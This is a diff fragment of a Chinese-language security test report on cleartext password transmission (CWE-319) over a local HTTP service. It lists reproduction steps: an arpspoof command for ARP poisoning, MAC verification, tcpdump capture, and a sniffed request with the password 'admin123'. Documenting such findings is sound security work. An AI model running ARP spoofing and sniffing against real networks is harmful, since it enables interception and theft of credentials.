@@ -26,22 +26,24 @@
 CWE编号	CWE-319（敏感信息明文传输）
 漏洞位置	ttp://192.168.8.149:8080
 泄露字段	password
+
 3.2 复现证据
 #	步骤	状态	关键输出
 1	ARP欺骗执行	✅	arpspoof -i eth0 -t 192.168.17.134 192.168.17.2
 2	欺骗验证	✅	网关MAC从 00:50:56:e9:d8:0b 变为 00:0c:29:ad:fa:e1
 3	流量抓取	✅	tcpdump 捕获到明文密码请求
 4	密码提取	✅	password=admin123
+
 3.3 捕获的HTTP请求示例
-text
 POST /play HTTP/1.1
-Host: 125.65.42.192:8123
+Host: 192.168.8.149:8080
 Content-Type: application/x-www-form-urlencoded
 
 username=admin&password=admin123
+
 四、攻击技术总结
 4.1 ARP欺骗原理
-text
+
 正常网络通信：
 受害机(134) ──► 网关(2) ──► 外网
 
